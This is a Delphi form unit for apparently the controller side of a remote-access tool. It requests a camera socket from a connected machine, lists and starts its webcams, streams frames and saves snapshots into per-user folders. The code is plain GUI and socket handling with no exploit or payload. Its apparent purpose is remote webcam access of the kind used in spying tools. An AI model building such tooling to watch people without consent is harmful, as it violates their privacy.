unit uWebcam;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, ToolWin, Menus, ImgList, ExtCtrls, StdCtrls, uCommands,
  bsSkinData, BusinessSkinForm;

type
  TForm9 = class(TForm)
    stat1: TStatusBar;
    pb1: TProgressBar;
    tlb1: TToolBar;
    btn1: TToolButton;
    btn2: TToolButton;
    il1: TImageList;
    img1: TImage;
    cbb1: TComboBox;
    btn3: TToolButton;
    bsbsnsknfrm1: TbsBusinessSkinForm;
    bskndt1: TbsSkinData;
    bscmprsdstrdskn1: TbsCompressedStoredSkin;
    procedure FormShow(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    function GetCBBItem(sString:String):Integer;
    procedure btn3Click(Sender: TObject);
  private
    { Private declarations }
  public
    sSocket:Integer;
    sCamSocket:Integer;
    isInList:Boolean;
    sUserFolder:String;
    procedure RequestImage;
    { Public declarations }
  end;

var
  Form9: TForm9;

implementation

uses uMain, uFunctions;

{$R *.dfm}
procedure TForm9.RequestImage;
begin
  if btn1.Down then begin
    pb1.Position := 0;
    cbb1.Enabled := false;
    btn2.Enabled := False;
    If SendPacket(sCamSocket,PACK_GETCAM,'') = false then begin
      Stat1.Panels.Items[0].Text := 'Socket Error!';
      sCamSocket := 0;
      btn1.Down := False;
      FormShow(nil);
    end;
  end else begin
    pb1.Position := 0;
    cbb1.Enabled := True;
    btn2.Enabled := True;
    If SendPacket(sCamSocket,PACK_STOPCAM,'') = false then begin
      Stat1.Panels.Items[0].Text := 'Socket Error!';
      sCamSocket := 0;
      btn1.Down := False;
      FormShow(nil);
    end;
  end;
end;

function TForm9.GetCBBItem(sString:String):Integer;
var
  iCount:INteger;
begin
  Result := -1;
  if cbb1.Items.Count = 0 then
    exit;
  for iCount := 0 to cbb1.Items.Count - 1 do  begin
    if sString = cbb1.Items.Strings[iCount] then begin
      Result := iCount;
      break;
    end;
  end;
end;

procedure TForm9.btn1Click(Sender: TObject);
var
  camIndex:Integer;
begin
  if btn1.Down then begin
    camIndex := GetCBBItem(cbb1.Text);
    if (cbb1.Text <> '') and (camIndex <> -1) then begin
      If SendPacket(sCamSocket,PACK_STARTCAM,IntToStr(camIndex)) then
        Stat1.Panels.Items[0].Text := 'Starting Cam...'
      else begin
        Stat1.Panels.Items[0].Text := 'Socket Error!';
        sCamSocket := 0;
        btn1.Down := False;
        FormShow(nil);
      end;
    end else begin
      Showmessage('Select a valid camera!');
      btn1.Down := False;
    end;
  end;
end;

procedure TForm9.btn2Click(Sender: TObject);
begin
  If SendPacket(sCamSocket,PACK_GETCAMLIST,'') then
    Stat1.Panels.Items[0].Text := 'Refreshing Camlist'
  else begin
    Stat1.Panels.Items[0].Text := 'Socket Error!';
    sCamSocket := 0;
    btn1.Down := False;
    FormShow(nil);
  end;
end;

procedure TForm9.btn3Click(Sender: TObject);
var
  strString:String;
begin
  strString := DateToStr(Date) + '_' + TimeToStr(Time);
  strString := StringReplace(strString,'.','_',[rfReplaceAll, rfIgnoreCase]);
  strString := StringReplace(strString,':','_',[rfReplaceAll, rfIgnoreCase]);
  img1.Picture.SaveToFile(sUserFolder + strString + '.bmp');
end;

procedure TForm9.FormShow(Sender: TObject);
var
  sTempStr:String;
begin
  btn1.Enabled := False;
  btn2.Enabled := False;
  cbb1.Enabled := False;
  if sCamSocket <> 0 then begin
    btn1.Enabled := True;
    btn2.Enabled := True;
    cbb1.Enabled := True;
    exit;
  end;
  sTempStr := Inttostr(sSocket);
  If SendPacket(sSocket,PACK_CAMSOCKET,sTempStr) then begin
    Stat1.Panels.Items[0].Text := 'Requesting Cam-Socket...';
  end else begin
    Stat1.Panels.Items[0].Text := 'Socket Error!';
  end;
end;

end.
